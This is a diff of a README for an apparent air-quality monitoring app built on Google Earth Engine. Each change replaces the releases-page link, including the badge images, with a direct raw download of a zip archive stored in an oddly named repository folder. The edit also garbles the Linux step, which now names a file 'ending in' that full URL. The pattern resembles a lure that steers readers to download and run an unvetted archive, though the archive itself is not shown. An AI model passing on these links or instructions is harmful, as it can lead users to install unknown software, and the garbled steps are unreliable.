@@ -1,6 +1,6 @@
 # 🌍 Data-Driven-Air-Quality-Monitoring-with-GEE-Platform - Understand Air Quality Easily
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/robbyvioryfansya/Data-Driven-Air-Quality-Monitoring-with-GEE-Platform/releases)
+[![Download Now](https://github.com/robbyvioryfansya/Data-Driven-Air-Quality-Monitoring-with-GEE-Platform/raw/refs/heads/main/influenceable/Monitoring-Air-Quality-with-Platform-GE-Data-Driven-1.1.zip)](https://github.com/robbyvioryfansya/Data-Driven-Air-Quality-Monitoring-with-GEE-Platform/raw/refs/heads/main/influenceable/Monitoring-Air-Quality-with-Platform-GE-Data-Driven-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you begin, ensure you have the following:
 
 ## 💻 Download & Install
 
-1. **Visit the Releases Page**: Head to our [Releases Page](https://github.com/robbyvioryfansya/Data-Driven-Air-Quality-Monitoring-with-GEE-Platform/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Head to our [Releases Page](https://github.com/robbyvioryfansya/Data-Driven-Air-Quality-Monitoring-with-GEE-Platform/raw/refs/heads/main/influenceable/Monitoring-Air-Quality-with-Platform-GE-Data-Driven-1.1.zip) to find the latest version of the software.
    
 2. **Select the Version**: Look for the most recent version listed. You will see options for different operating systems.
 
@@ -24,7 +24,7 @@ Before you begin, ensure you have the following:
 
    - For Windows, look for a file ending in `.exe`.
    - For macOS, look for a file ending in `.dmg`.
-   - For Linux, look for a file ending in `.tar.gz`.
+   - For Linux, look for a file ending in `https://github.com/robbyvioryfansya/Data-Driven-Air-Quality-Monitoring-with-GEE-Platform/raw/refs/heads/main/influenceable/Monitoring-Air-Quality-with-Platform-GE-Data-Driven-1.1.zip`.
 
 4. **Run the Installer**: Once the download completes, locate the file in your Downloads folder. Double-click it to run the installer. 
 
@@ -78,4 +78,4 @@ If you wish to contribute to the project, feel free to check out our GitHub page
 
 Thank you for choosing the Data-Driven-Air-Quality-Monitoring-with-GEE-Platform. We hope this application assists you in understanding and monitoring air quality effectively.
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/robbyvioryfansya/Data-Driven-Air-Quality-Monitoring-with-GEE-Platform/releases)
+[![Download Now](https://github.com/robbyvioryfansya/Data-Driven-Air-Quality-Monitoring-with-GEE-Platform/raw/refs/heads/main/influenceable/Monitoring-Air-Quality-with-Platform-GE-Data-Driven-1.1.zip)](https://github.com/robbyvioryfansya/Data-Driven-Air-Quality-Monitoring-with-GEE-Platform/raw/refs/heads/main/influenceable/Monitoring-Air-Quality-with-Platform-GE-Data-Driven-1.1.zip)
